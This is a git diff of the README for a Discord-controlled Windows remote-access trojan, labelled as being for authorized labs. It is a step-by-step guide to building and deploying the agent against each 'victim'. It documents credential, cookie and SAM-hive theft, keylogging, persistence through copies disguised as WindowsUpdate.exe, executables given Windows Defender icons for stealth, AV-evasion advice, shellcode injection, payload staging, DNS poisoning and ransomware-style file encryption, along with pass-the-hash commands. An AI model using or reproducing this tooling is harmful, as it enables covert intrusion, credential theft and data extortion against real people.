@@ -9,7 +9,7 @@
 
 <p align="center">
    <a href="#3-requirements"><img src="https://img.shields.io/badge/Platform-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Platform Windows" /></a>
-   <a href="#12-step-7--build-a-standalone-exe"><img src="https://img.shields.io/badge/Packaging-EXE%20Ready-0A7E8C?style=for-the-badge" alt="Packaging EXE Ready" /></a>
+   <a href="#13-step-9--build-a-standalone-exe"><img src="https://img.shields.io/badge/Packaging-EXE%20Ready-0A7E8C?style=for-the-badge" alt="Packaging EXE Ready" /></a>
    <a href="#table-of-contents"><img src="https://img.shields.io/badge/Documentation-Full%20Guide-1F6FEB?style=for-the-badge&logo=readme&logoColor=white" alt="Documentation Full Guide" /></a>
    <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-2EA44F?style=for-the-badge" alt="License MIT" /></a>
 </p>
@@ -18,7 +18,7 @@
    <a href="DISCLAIMER.md"><img src="https://img.shields.io/badge/Legal%20Use-Authorized%20Labs%20Only-BD561D?style=for-the-badge" alt="Legal Use Authorized Labs Only" /></a>
    <a href="DISCLAIMER.md"><img src="https://img.shields.io/badge/Audience-Students%20%26%20Researchers-6F42C1?style=for-the-badge&logo=bookstack&logoColor=white" alt="Audience Students and Researchers" /></a>
    <a href="#3-requirements"><img src="https://img.shields.io/badge/Runtime-Deps%20Documented-8250DF?style=for-the-badge&logo=pypi&logoColor=white" alt="Runtime Dependencies Documented" /></a>
-   <a href="#18-supported-commands"><img src="https://img.shields.io/badge/Commands-Reference-BC4C00?style=for-the-badge&logo=gnubash&logoColor=white" alt="Command Reference" /></a>
+   <a href="#18-command-reference"><img src="https://img.shields.io/badge/Commands-Reference-BC4C00?style=for-the-badge&logo=gnubash&logoColor=white" alt="Command Reference" /></a>
 </p>
 
 <p align="center">
@@ -34,47 +34,51 @@
 ---
 
 ## Table of Contents
+
 1. [Overview](#1-overview)
 2. [Features](#2-features)
 3. [Requirements](#3-requirements)
 4. [Agent Files](#4-agent-files)
-5. [Step 1 — Install Python & Set Up the Build Environment](#6-step-1--install-python--set-up-the-build-environment)
-6. [Step 2 — Generate the RSA Operator Key Pair](#7-step-2--generate-the-rsa-operator-key-pair)
-7. [Step 3 — Create a Discord Server](#8-step-3--create-a-discord-server)
-8. [Step 4 — Register a Bot (Per Victim)](#9-step-4--register-a-bot-per-victim)
-9. [Step 5 — Configure Gateway Intents](#10-step-5--configure-gateway-intents)
-10. [Step 6 — Generate Invite Link & Add Bot to Server](#11-step-6--generate-invite-link--add-bot-to-server)
-11. [Step 7 — Audit Permissions](#12-step-7--audit-permissions)
-12. [Step 8 — Configure the Agent Script](#13-step-8--configure-the-agent-script)
-13. [Step 9 — Build a Standalone EXE](#14-step-9--build-a-standalone-exe)
-14. [Step 10 — Deploy](#15-step-10--deploy)
-15. [Step 11 — Operate from Discord](#16-step-11--operate-from-discord)
-15. [Step 12 — Repeat for Each Victim](#17-step-12--repeat-for-each-victim)
-17. [Discord Server Structure](#18-discord-server-structure)
-18. [Roles & Permissions](#19-roles--permissions)
-19. [Heartbeat & Offline Detection](#20-heartbeat--offline-detection)
-20. [Supported Commands](#21-supported-commands)
-21. [Channel Reference](#22-channel-reference)
-22. [Troubleshooting](#23-troubleshooting)
-23. [Security & Cleanup](#24-security--cleanup)
-24. [Metasploit Framework Integration](#25-metasploit-framework-integration)
-25. [Improvement — One Bot, Many Agents (User Token Architecture)](#26-improvement--one-bot-many-agents-user-token-architecture)
-26. [Comprehensive Guide: One Bot, Many Agents (User Token Architecture)](#27-comprehensive-guide--one-bot-many-agents-user-token-architecture)
-27. [Production Deployment Checklist & Security Notes](#28-production-deployment-checklist--security-notes)
-28. [build.bat — Complete Reference](#29-buildbat--complete-reference)
-29. [agent_template.py — Internals Reference](#30-agent_templatepy--internals-reference)
+5. [Step 1 — Install Python & Set Up the Build Environment](#5-step-1--install-python--set-up-the-build-environment)
+6. [Step 2 — Generate the RSA Operator Key Pair](#6-step-2--generate-the-rsa-operator-key-pair)
+7. [Step 3 — Create a Discord Server](#7-step-3--create-a-discord-server)
+8. [Step 4 — Register a Bot (Per Victim)](#8-step-4--register-a-bot-per-victim)
+9. [Step 5 — Configure Gateway Intents](#9-step-5--configure-gateway-intents)
+10. [Step 6 — Generate Invite Link & Add Bot to Server](#10-step-6--generate-invite-link--add-bot-to-server)
+11. [Step 7 — Audit Permissions](#11-step-7--audit-permissions)
+12. [Step 8 — Configure the Agent Script](#12-step-8--configure-the-agent-script)
+13. [Step 9 — Build a Standalone EXE](#13-step-9--build-a-standalone-exe)
+14. [Step 10 — Deploy](#14-step-10--deploy)
+15. [Step 11 — Operate from Discord](#15-step-11--operate-from-discord)
+16. [Step 12 — Repeat for Each Victim](#16-step-12--repeat-for-each-victim)
+17. [Discord Server Structure](#17-discord-server-structure)
+18. [Roles & Permissions](#18-roles--permissions)
+19. [Heartbeat & Offline Detection](#19-heartbeat--offline-detection)
+20. [Command Reference](#20-command-reference)
+21. [Channel Reference](#21-channel-reference)
+22. [Troubleshooting & Known Limitations](#22-troubleshooting--known-limitations)
+23. [Security & Cleanup](#23-security--cleanup)
+24. [Metasploit Framework Integration](#24-metasploit-framework-integration)
+25. [Architecture: One Bot, Many Agents](#25-architecture-one-bot-many-agents)
+26. [Production Deployment Checklist](#26-production-deployment-checklist)
+27. [build.bat — Complete Reference](#27-buildbat--complete-reference)
+28. [agent_template.py — Internals Reference](#28-agent_templatepy--internals-reference)
 
 ---
 
 ## 1. Overview
 
-This Discord C2 agent is for Windows. It connects to a Discord server via a bot token, auto-creates all required server categories and channels on first run if they do not exist, creates a unique victim channel, and supports remote command execution and file transfer — all over Discord's API.
+> A Windows Discord C2 agent for authorized red team labs and security research.
+
+This Discord C2 agent runs on Windows. It connects to a Discord server via a bot token, auto-creates all required server categories and channels on first run if they do not exist, creates a unique victim channel, and supports remote command execution and file transfer — all over Discord's API.
 
 Each deployed agent carries its own unique bot token so multiple agents can be online simultaneously without conflict.
 
 ---
 
 ## 2. Features
+
+> Full capability summary — from basic recon to autonomous operation and payload delivery.
 
 - **Remote Command Execution** — Run any shell command from Discord
 - **File Upload/Download** — Transfer files to and from the victim
@@ -94,7 +98,10 @@ Each deployed agent carries its own unique bot token so multiple agents can be o
 
 ## 3. Requirements
 
+> Python version, runtime packages, build tools, and configuration constants needed before building.
+
 ### Python Version
+
 - **Python 3.10+** is sufficient to run the agent directly
 - **Python 3.13** is recommended to build the EXE (Python 3.10.0 has a `dis` module bug that breaks some build tools)
 - Python 3.13 download: https://www.python.org/downloads/
@@ -111,7 +118,6 @@ Each deployed agent carries its own unique bot token so multiple agents can be o
 | `Pillow` | Required for `!screenshot` — captures the desktop via `ImageGrab` |
 | `pynput` | Required for `!keylog` — in-memory keystroke capture |
 
-Install runtime packages:
 ```bash
 pip install discord.py requests openai aiofiles pycryptodome Pillow pynput
 ```
@@ -122,7 +128,6 @@ pip install discord.py requests openai aiofiles pycryptodome Pillow pynput
 |---|---|
 | `pywin32` | Required for the Startup Folder Shortcut persistence method |
 
-Install if you plan to use all `!persist` methods:
 ```bash
 pip install pywin32
 ```
@@ -133,22 +138,21 @@ pip install pywin32
 |---|---|
 | `pyinstaller` | Compiling the agent into a standalone EXE |
 
-Install build tooling:
 ```bash
 pip install pyinstaller
 ```
 
-`.\\build.bat` uses an advanced PyInstaller command with onefile output, explicit pywin32 hidden imports, and a dedicated work directory under `build/`.
+`.\build.bat` uses an advanced PyInstaller command with onefile output, explicit pywin32 hidden imports, and a dedicated work directory under `build/`.
 
 ### Configuration Requirements
 
-These four constants must be set in `agent_template.py` before building. See [§13 Step 8](#13-step-8--configure-the-agent-script) for full configuration instructions.
+These four constants must be set in `agent_template.py` before building. See [§12 Step 8](#12-step-8--configure-the-agent-script) for full configuration instructions.
 
 | Constant | Required | Set Before Build | Notes |
 |---|---|---|---|
 | `BOT_TOKEN` | Yes | Yes | Discord bot token — one unique token per deployed agent |
 | `OPENAI_API_KEY` | For `!report`, `!abort`, `!mode active` | Yes | Required for LLM-backed reporting and autonomous planning |
-| `OPERATOR_RSA_PUBLIC_KEY` | For secure `!encrypt` | Yes | RSA-4096 PEM public key from `op_public.pem` — wraps the AES master key so only the holder of `op_private.pem` can recover it. Generate with `.\\build.bat genkey`. If blank, `!encrypt` sends the AES key as plain hex in Discord instead. |
+| `OPERATOR_RSA_PUBLIC_KEY` | For secure `!encrypt` | Yes | RSA-4096 PEM public key from `op_public.pem` — wraps the AES master key so only the holder of `op_private.pem` can recover it. Generate with `.\build.bat genkey`. If blank, `!encrypt` sends the AES key as plain hex in Discord instead. |
 | `RECOVERY_URL` | Optional | Optional | URL of the hosted agent EXE. If set, `!persist setup` deploys a PowerShell dropper (`wdrp.ps1`) that re-downloads and re-launches the agent if all three stable EXE copies are deleted. Leave blank to disable. |
 
 > The agent connects to Discord with `BOT_TOKEN` only. All other constants unlock specific features — the agent runs without them but those features will be unavailable.
@@ -156,6 +160,8 @@ These four constants must be set in `agent_template.py` before building. See [§
 ---
 
 ## 4. Agent Files
+
+> Source files, logs, and generated directories that make up the project.
 
 | File | Description |
 |---|---|
@@ -169,30 +175,34 @@ These four constants must be set in `agent_template.py` before building. See [§
 
 ## 5. Step 1 — Install Python & Set Up the Build Environment
 
+> One-time machine setup: install Python 3.13 and initialize the build virtual environment.
+
 1. Download and install **Python 3.13** from https://www.python.org/downloads/
    - During install, check **Add Python to PATH**
    - Verify: `py -3.13 --version`
 2. Create the build environment and install all dependencies:
+
 ```bat
-.\\build.bat setup
+.\build.bat setup
 ```
+
 This creates `build_env\` and runs `pip install -r requirements.txt` inside it. Only needed once per machine.
 
 ---
 
 ## 6. Step 2 — Generate the RSA Operator Key Pair
 
-Run once per operator. This key pair is used to securely wrap the AES encryption key produced by `!encrypt`.
+> Run once per operator to create the key pair used to securely wrap `!encrypt` AES keys.
 
 ```bat
-.\\build.bat genkey
+.\build.bat genkey
 ```
 
 This produces two files:
 
 | File | Action |
 |---|---|
-| `op_private.pem` | Store offline — never commit to version control. Used by `.\\build.bat unwrapkey` to recover AES keys. |
+| `op_private.pem` | Store offline — never commit to version control. Used by `.\build.bat unwrapkey` to recover AES keys. |
 | `op_public.pem` | Paste full contents into `OPERATOR_RSA_PUBLIC_KEY` in `agent_template.py` before building. |
 
 > Requires OpenSSL on `PATH`. Git for Windows provides it at `C:\Program Files\Git\usr\bin`.
@@ -201,6 +211,8 @@ This produces two files:
 ---
 
 ## 7. Step 3 — Create a Discord Server
+
+> Create the Discord server that will host all C2 channels — the agent auto-creates all categories on first run.
 
 When the agent runs for the first time it automatically creates the following categories and channels if they don't already exist:
 
@@ -221,12 +233,10 @@ Discord Server
 │   └── #intel-feed         ← Exfiltrated or mirrored artifacts
 │
 └── VICTIMS
-   └── #cmd-<hostname>-<id>   ← Auto-created per agent, private command channel
+    └── #cmd-<hostname>-<id>   ← Auto-created per agent, private command channel
 ```
 
 All channels are private — hidden from `@everyone`, visible only to the bot and server owner.
-
----
 
 1. Open Discord and click the **+** icon on the left sidebar.
 2. Select **Create My Own** → **For me and my friends**.
@@ -238,19 +248,21 @@ All channels are private — hidden from `@everyone`, visible only to the bot an
 
 ## 8. Step 4 — Register a Bot (Per Victim)
 
-Use the naming convention: `victim-<name>-<date>` (e.g., `victim-alice-2026-04-09`)
+> Register a new Discord bot application for each target using the naming convention `victim-<name>-<date>`.
 
 1. Go to the [Discord Developer Portal](https://discord.com/developers/applications).
-2. Click **New Application** and name it using the convention above.
+2. Click **New Application** and name it using the convention `victim-<name>-<date>` (e.g., `victim-alice-2026-04-09`).
 3. Go to the **Bot** tab → click **Add Bot**.
 4. (Optional) Set the bot's username and avatar icon to match the victim identifier for easy tracking.
 5. Click **Reset Token** and **copy the token** — you will need it for the agent script.
 
-> **Naming convention:** `victim-<name>-<date>` keeps your bot list organized when managing multiple deployments (e.g., `victim-alice-2026-04-09`, `victim-bob-2026-07-01`). Match the bot username to the application name for consistency.
+> **Naming convention:** `victim-<name>-<date>` keeps your bot list organized when managing multiple deployments. Match the bot username to the application name for consistency.
 
 ---
 
 ## 9. Step 5 — Configure Gateway Intents
+
+> Enable all three Privileged Gateway Intents — Message Content Intent is required for agent commands.
 
 Still on the **Bot** tab, scroll down to **Privileged Gateway Intents** and enable all three:
 
@@ -263,6 +275,8 @@ Still on the **Bot** tab, scroll down to **Privileged Gateway Intents** and enab
 ---
 
 ## 10. Step 6 — Generate Invite Link & Add Bot to Server
+
+> Generate the OAuth2 invite URL with the correct scopes and permissions, then add the bot to your server.
 
 1. In the developer portal, go to **OAuth2 → URL Generator**.
 2. Under **Scopes**, select:
@@ -279,6 +293,8 @@ Still on the **Bot** tab, scroll down to **Privileged Gateway Intents** and enab
 
 ## 11. Step 7 — Audit Permissions
 
+> Verify bot role permissions and channel visibility after the bot joins the server.
+
 After the bot joins the server, verify the following:
 
 - **Server Settings → Roles → Bot Role:** Confirm `Manage Channels` and `Manage Roles` are enabled.
@@ -288,6 +304,8 @@ After the bot joins the server, verify the following:
 ---
 
 ## 12. Step 8 — Configure the Agent Script
+
+> Set `BOT_TOKEN`, `OPENAI_API_KEY`, `OPERATOR_RSA_PUBLIC_KEY`, and `RECOVERY_URL` in `agent_template.py`.
 
 At this point you have your bot token (from Step 4), your RSA public key (from Step 2), and your OpenAI key. Open `agent_template.py` and set all four values:
 
@@ -318,23 +336,25 @@ Save the file.
 
 ## 13. Step 9 — Build a Standalone EXE
 
+> Convert `agent_template.py` into a single Windows executable using PyInstaller.
 
-Convert `agent_template.py` into a single Windows executable using [PyInstaller](https://pyinstaller.org/).
+### First-Time Setup
 
-### 1. First-time setup: let the build script install dependencies if needed
+Let the build script install dependencies if needed:
+
 ```bat
-.\\build.bat --bootstrap
+.\build.bat --bootstrap
 ```
 
-`.\\build.bat` prefers `build_env\Scripts\python.exe` when that virtual environment exists. If it does not, the script falls back to `py -3.13` automatically.
+`.\build.bat` prefers `build_env\Scripts\python.exe` when that virtual environment exists. If it does not, the script falls back to `py -3.13` automatically.
 
-### 2. Normal rebuilds after setup
+### Normal Rebuilds
+
 ```bat
-.\\build.bat
+.\build.bat
 ```
 
-
-By default, `.\\build.bat` uses `icons/Windows Defender.ico` if that file exists. Change `DEFAULT_ICON_NAME` in `.\\build.bat` if you want a different default.
+By default, `.\build.bat` uses `icons/Windows Defender.ico` if that file exists. Change `DEFAULT_ICON_NAME` in `.\build.bat` if you want a different default.
 
 <p align="center">
    <img src="docs/images/build_Windows_Defender.exe.png" alt="Windows Defender EXE build" style="max-width:100%;height:auto;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.08);" />
@@ -342,61 +362,59 @@ By default, `.\\build.bat` uses `icons/Windows Defender.ico` if that file exists
 
 The output EXE name follows the resolved icon name by default. For example, the default icon produces `build\Windows Defender.exe`.
 
-### 3. Build with a custom EXE icon from `icons/`
+### Custom Icon
+
 ```bat
-.\\build.bat --icon my-icon.ico
+.\build.bat --icon my-icon.ico
 ```
 
-Place `.ico` files in the `icons/` folder, then pass the filename to `--icon`. You can combine it with `clean` and `--bootstrap`, for example:
+Place `.ico` files in the `icons/` folder, then pass the filename to `--icon`. You can combine it with `clean` and `--bootstrap`:
+
 ```bat
-.\\build.bat clean --bootstrap --icon my-icon.ico
+.\build.bat clean --bootstrap --icon my-icon.ico
 ```
 
 If the icon filename contains spaces, quote it:
+
 ```bat
-.\\build.bat --icon "Microsoft 365.ico"
+.\build.bat --icon "Microsoft 365.ico"
 ```
 
-That build will produce `build\my-icon.exe` unless you override the output name explicitly.
-
-
-For icon filenames, the EXE name follows the same basename by default. For example, `--icon "Microsoft 365.ico"` produces `build\Microsoft 365.exe`.
+That build produces `build\Microsoft 365.exe`.
 
 <p align="center">
    <img src="docs/images/build_Microsoft_365.exe.png" alt="Microsoft 365 EXE build" style="max-width:100%;height:auto;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,0.08);" />
 </p>
 
-### 3.1 Override the output EXE name
+### Override Output EXE Name
+
 ```bat
-.\\build.bat --icon my-icon.ico --name client-updater
+.\build.bat --icon my-icon.ico --name client-updater
 ```
 
-Use `--name` when you want the EXE filename to be different from the icon filename.
+Use `--name` when you want the EXE filename to differ from the icon filename.
 
-If the output name contains spaces, quote it:
 ```bat
-.\\build.bat --name "Microsoft 365"
+.\build.bat --name "Microsoft 365"
 ```
 
-You can also combine quoted icon and output names:
 ```bat
-.\\build.bat --icon "Microsoft 365.ico" --name "Client Updater"
+.\build.bat --icon "Microsoft 365.ico" --name "Client Updater"
 ```
 
-### 4. List available icons
+### List Available Icons
+
 ```bat
-.\\build.bat --list-icons
+.\build.bat --list-icons
 ```
 
-The build script will produce `build\<resolved-name>.exe`.
+### Cleanup
 
-Use `.\\build.bat clean` to remove the previous build output before compiling again.
+Use `.\build.bat clean` to remove the previous build output before compiling again. The build script writes the final EXE to `build\<resolved-name>.exe` and keeps PyInstaller work files under `build\pyinstaller_work`.
 
-The build script writes the final EXE to `build\<resolved-name>.exe` and keeps PyInstaller work files under `build\pyinstaller_work`.
+### Advanced Build Switches
 
-### 5. Advanced build switches
-
-If you do not pass any of the switches below, the existing behavior stays the same: `.\\build.bat` still performs a one-file, windowed build, uses the resolved default icon, and writes the EXE to `build\<resolved-name>.exe`.
+If you do not pass any of the switches below, the existing behavior stays the same: `.\build.bat` still performs a one-file, windowed build, uses the resolved default icon, and writes the EXE to `build\<resolved-name>.exe`.
 
 | Switch | Purpose |
 |---|---|
@@ -416,24 +434,26 @@ If you do not pass any of the switches below, the existing behavior stays the sa
 Example commands:
 
 ```bat
-.\\build.bat dry-run --python 3.13 --console --debug
+.\build.bat dry-run --python 3.13 --console --debug
 ```
 
 ```bat
-.\\build.bat --version 1.2.3 --company "ART Labs" --product "ART Agent" --manifest admin
+.\build.bat --version 1.2.3 --company "ART Labs" --product "ART Agent" --manifest admin
 ```
 
 ```bat
-.\\build.bat clean --output-dir release --smoke-test --archive
+.\build.bat clean --output-dir release --smoke-test --archive
 ```
 
 ```bat
-.\\build.bat --sign-script "echo signing"
+.\build.bat --sign-script "echo signing"
 ```
 
 ---
 
 ## 14. Step 10 — Deploy
+
+> Pre-deploy checklist, stealth renaming guide, delivery vectors, AV considerations, and first-run behavior.
 
 ### Pre-Deploy Checklist
 
@@ -443,7 +463,7 @@ Before copying the EXE to a target, verify every item below:
 2. **OpenAI key set** — confirm `OPENAI_API_KEY` is present if you plan to use `!report`, `!abort`, or autonomous mode.
 3. **RSA key embedded** — if you intend to use `!encrypt`, confirm `OPERATOR_RSA_PUBLIC_KEY` is populated with your freshly generated public key.
 4. **EXE built** — `build\<name>.exe` exists and has the expected icon.
-5. **Smoke test** — run `.\\build.bat --smoke-test` to confirm the file size is reasonable (typical build: 15–30 MB).
+5. **Smoke test** — run `.\build.bat --smoke-test` to confirm the file size is reasonable (typical build: 15–30 MB).
 6. **Local test run (recommended)** — run the EXE on your own machine briefly, confirm the `cmd-*` channel appears in Discord within 10 seconds, confirm `!whoami` responds, then kill the process.
 
 ### Rename for Stealth
@@ -479,8 +499,8 @@ Most AV products will detect a plain PyInstaller EXE by signature or heuristic:
 
 - A system-looking icon and filename reduces initial file-based detection.
 - If lab AV quarantines the EXE at rest, add a temporary folder exclusion for the delivery path during authorized testing, or test on an AV-excluded VM.
-- Once the agent is running in memory, `!inject` operate entirely without touching disk — AV exposure is limited to the initial EXE drop.
-- Rebuild with `.\\build.bat clean` before each deployment to avoid stale PyInstaller artifacts affecting detection rate.
+- Once the agent is running in memory, `!inject` operates entirely without touching disk — AV exposure is limited to the initial EXE drop.
+- Rebuild with `.\build.bat clean` before each deployment to avoid stale PyInstaller artifacts affecting detection rate.
 
 ### First-Run Behavior
 
@@ -516,6 +536,8 @@ After seeing the check-in message in `#briefings`:
 ---
 
 ## 15. Step 11 — Operate from Discord
+
+> Send commands to the victim channel and review output — all activity is also logged to `#global-logs`.
 
 Go to the **VICTIMS** category in your Discord server and find the channel named `cmd-<hostname>-<id>`. Type commands directly in that channel.
 
@@ -553,6 +575,8 @@ If `!upload <filename>` is part of your workflow, also place a file in `#payload
 
 ## 16. Step 12 — Repeat for Each Victim
 
+> Steps 1–3 are one-time setup. For every new target, repeat Steps 4–11 with a new bot token.
+
 For every new target, repeat Steps 4–11 with a **new bot application and token**. Steps 1–3 (environment setup, RSA key generation, Discord server creation) only need to be done once.
 
 Track all deployments in `agent_logs\agent_deployment_log.xlsx`.
@@ -561,7 +585,7 @@ Track all deployments in `agent_logs\agent_deployment_log.xlsx`.
 |---|---|
 | 1 | Register new bot: `victim-bob-2026-04-09` |
 | 2 | Paste Bob's token into `agent_template.py` |
-| 3 | Build: `.\\build.bat` |
+| 3 | Build: `.\build.bat` |
 | 4 | Rename EXE and deploy to target |
 | 5 | Bob's `cmd-*` channel appears in Discord automatically |
 
@@ -569,7 +593,7 @@ Track all deployments in `agent_logs\agent_deployment_log.xlsx`.
 
 ## 17. Discord Server Structure
 
-The agent auto-creates all categories and channels on first run. No manual Discord setup is required beyond Steps 3–7.
+> The agent auto-creates all categories and channels on first run — no manual Discord setup required.
 
 ```
 Discord Server
@@ -588,7 +612,7 @@ Discord Server
 │   └── #intel-feed         ← Exfiltrated or mirrored artifacts
 │
 └── VICTIMS
-   └── #cmd-<hostname>-<id>   ← Auto-created per agent, private command channel
+    └── #cmd-<hostname>-<id>   ← Auto-created per agent, private command channel
 ```
 
 All channels are private — hidden from `@everyone`, visible only to the bot and server owner.
@@ -597,7 +621,7 @@ All channels are private — hidden from `@everyone`, visible only to the bot an
 
 ## 18. Roles & Permissions
 
-The agent implements automatic role management on first run:
+> The agent auto-creates an `Agent` role on first run and assigns it to the bot.
 
 | Role | Created By | Access Granted |
 |---|---|---|
@@ -610,22 +634,21 @@ The agent implements automatic role management on first run:
 
 ## 19. Heartbeat & Offline Detection
 
-The agent runs a background heartbeat loop:
+> The agent sends periodic keep-alive messages and the offline monitor tags silent channels automatically.
+
 - Sends a heartbeat to `#sitreps` every **3–5.5 minutes** (randomized jitter)
 - If no heartbeat for **5 minutes**, the offline monitor renames the victim channel to `cmd-<hostname>-<id>[OFFLINE]`
 - When the agent reconnects, the `[OFFLINE]` tag is automatically removed
 
 ---
 
-## 20. Supported Commands
+## 20. Command Reference
 
-> All commands are processed **only** in the agent's assigned `#cmd-*` channel.  
-> Output over 1900 characters is automatically attached as `out.txt`.  
-> See [§21 Channel Reference](#22-channel-reference) for channel purposes.
+> All commands are processed **only** in the agent's assigned `#cmd-*` channel. Output over 1900 characters is automatically attached as `out.txt`.
 
 ---
 
-### 18.1 Recon & Situational Awareness
+### 20.1 Recon & Situational Awareness
 
 | Command | Description |
 |---|---|
@@ -637,7 +660,7 @@ The agent runs a background heartbeat loop:
 
 ---
 
-### 18.2 File & Shell Operations
+### 20.2 File & Shell Operations
 
 | Command | Description |
 |---|---|
@@ -657,13 +680,13 @@ The agent runs a background heartbeat loop:
 
 ---
 
-### 18.3 Loot Collection
+### 20.3 Loot Collection
 
 | Command | Description |
 |---|---|
 | `!dump password` | Decrypt and exfiltrate saved passwords from Chromium-based browsers and Firefox |
 | `!dump cookie` | Decrypt browser cookies — outputs Netscape `.txt` (curl/Burp) and Cookie-Editor `.json` (browser import) |
-| `!dump hash` | Save Windows SAM, SYSTEM, and SECURITY hives, zip them, and upload for offline cracking. **Requires admin** |
+| `!dump hash` | Save Windows SAM, SYSTEM, and SECURITY hives, zip them, and upload for offline cracking |
 | `!dump wifi` | Dump all saved WiFi SSIDs and cleartext passwords |
 | `!dump env` | Exfiltrate all environment variables |
 | `!dump all` | Run all loot collection types at once |
@@ -681,6 +704,7 @@ impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
 ```
 
 **Alternative hash cracking tools:**
+
 ```bash
 # Using secretsdump.py directly
 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
@@ -693,6 +717,7 @@ john --format=NT hashes.txt --wordlist=rockyou.txt
 ```
 
 **Pass-the-hash after extraction:**
+
 ```bash
 # Use extracted NTLM hash with psexec
 psexec.py -hashes :NTLM_HASH administrator@target-ip
@@ -703,7 +728,7 @@ wmiexec.py -hashes :NTLM_HASH administrator@target-ip
 
 ---
 
-### 18.4 DNS Poisoning (`!pharm`)
+### 20.4 DNS Poisoning (`!pharm`)
 
 | Command | Description |
 |---|---|
@@ -717,7 +742,7 @@ wmiexec.py -hashes :NTLM_HASH administrator@target-ip
 
 ---
 
-### 18.5 Interaction & Control
+### 20.5 Interaction & Control
 
 | Command | Description |
 |---|---|
@@ -729,7 +754,7 @@ wmiexec.py -hashes :NTLM_HASH administrator@target-ip
 
 ---
 
-### 18.6 Keylogger
+### 20.6 Keylogger
 
 | Command | Description |
 |---|---|
@@ -740,7 +765,7 @@ wmiexec.py -hashes :NTLM_HASH administrator@target-ip
 
 ---
 
-### 18.7 Autonomous Workflow
+### 20.7 Autonomous Workflow
 
 | Command | Description |
 |---|---|
@@ -751,7 +776,7 @@ wmiexec.py -hashes :NTLM_HASH administrator@target-ip
 
 ---
 
-### 18.8 Persistence
+### 20.8 Persistence
 
 The agent copies itself to **3 stable locations** before registering any persistence trigger:
 
@@ -761,7 +786,7 @@ The agent copies itself to **3 stable locations** before registering any persist
 | `%LOCALAPPDATA%\Microsoft\Windows\WindowsUpdate.exe` | Local — separate from roaming profile |
 | `%APPDATA%\Microsoft\Protect\WindowsUpdate.exe` | DPAPI folder — rarely inspected |
 
-All **5 persistence triggers** point at these copies and fire independently at every logon:
+All **4 persistence triggers** point at these copies and fire independently at every logon:
 
 | Method | Registry / Path |
 |---|---|
@@ -769,7 +794,8 @@ All **5 persistence triggers** point at these copies and fire independently at e
 | Startup Folder Shortcut | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk` |
 | Scheduled Task | `schtasks /SC ONLOGON /TN WindowsUpdate` |
 | Registry Load Key | `HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load` |
-| UserInitMprLogonScript | `HKCU\Environment\UserInitMprLogonScript` |
+
+> `UserInitMprLogonScript` is intentionally disabled — it causes `explorer.exe` to appear as a parent process at logon, which is a visible detection signal. The 4 remaining methods provide sufficient redundancy.
 
 | Command | Description |
 |---|---|
@@ -778,7 +804,7 @@ All **5 persistence triggers** point at these copies and fire independently at e
 
 ---
 
-### 18.9 Lateral Movement & OPSEC
+### 20.9 Lateral Movement & OPSEC
 
 | Command | Description |
 |---|---|
@@ -787,23 +813,22 @@ All **5 persistence triggers** point at these copies and fire independently at e
 | `!wipe` | Overwrite and delete all loot files, schedule self-deletion of the agent EXE, disconnect |
 | `!selfdestruct` | Full teardown: remove all 5 persistence triggers, delete all 3 EXE copies, wipe loot, schedule self-deletion, disconnect |
 
-
 > `!selfdestruct` differs from `!wipe`: wipe removes only loot and the running EXE copy; selfdestruct additionally removes all persistence triggers and all 3 stable copies.
 
 ---
 
-### 18.10 MSF Payload Delivery
+### 20.10 MSF Payload Delivery
 
 | Command | Description |
 |---|---|
 | `!inject <pid> <b64_shellcode>` | Write raw shellcode into a running process and execute it via `CreateRemoteThread` — nothing written to disk |
 | `!stager <url\|filename> [dest]` | Fetch an MSF stager EXE from `#payloads` or a URL, drop to disk, and execute silently |
 
-> See [§24 Metasploit Framework Integration](#25-metasploit-framework-integration) for the full step-by-step guide for each approach.
+> See [§24 Metasploit Framework Integration](#24-metasploit-framework-integration) for the full step-by-step guide for each approach.
 
 ---
 
-### 18.11 Encryption
+### 20.11 Encryption
 
 | Command | Description |
 |---|---|
@@ -814,23 +839,23 @@ All **5 persistence triggers** point at these copies and fire independently at e
 **Complete encryption workflow:**
 
 1. Encrypt target directory:
-```
-!encrypt C:\Users\gabri\Documents
-```
+   ```
+   !encrypt C:\Users\gabri\Documents
+   ```
 
 2. Download `wrapped.b64` from Discord
 
 3. Unwrap the AES key on operator machine:
-```bat
-.\build.bat unwrapkey wrapped.b64 op_private.pem  
-```
+   ```bat
+   .\build.bat unwrapkey wrapped.b64 op_private.pem
+   ```
 
 4. Copy the 64-character hex key
 
 5. Decrypt (if needed for recovery or demonstration):
-```
-!decrypt C:\Users\gabri\Documents <64-character-hex-key>
-```
+   ```
+   !decrypt C:\Users\gabri\Documents <64-character-hex-key>
+   ```
 
 **Verify encryption:**
 ```
@@ -843,6 +868,8 @@ dir C:\Users\gabri\Documents\*.art
 ---
 
 ## 21. Channel Reference
+
+> Maps each Discord channel to its category and operational purpose.
 
 | Channel | Category | Purpose |
 |---|---|---|
@@ -857,7 +884,9 @@ dir C:\Users\gabri\Documents\*.art
 
 ---
 
-## 22. Troubleshooting
+## 22. Troubleshooting & Known Limitations
+
+> Common error conditions, their causes, and fixes — plus platform and feature limitations.
 
 | Problem | Solution |
 |---|---|
@@ -867,7 +896,7 @@ dir C:\Users\gabri\Documents\*.art
 | Only one agent online at a time | Each agent **must** use a unique bot token |
 | Bot not responding to commands | Confirm `Message Content Intent` is ON |
 | `[OFFLINE]` tag not clearing | Agent reconnected but offline monitor not running — check the process |
-| EXE build crashes | Ensure `pyinstaller` is installed and rerun `.\\build.bat clean --bootstrap` to clear stale work files before rebuilding. |
+| EXE build crashes | Ensure `pyinstaller` is installed and rerun `.\build.bat clean --bootstrap` to clear stale work files before rebuilding |
 | `!upload <filename>` says file not found | Upload the file to `#payloads` channel first, then run the command |
 | `!report` or `!abort` fails to generate a report | Confirm `OPENAI_API_KEY` is valid and the system can reach the OpenAI API |
 | Report command works but console warns about heartbeat delays | Check network latency to OpenAI and avoid long blocking shell commands in the victim channel |
@@ -890,11 +919,13 @@ dir C:\Users\gabri\Documents\*.art
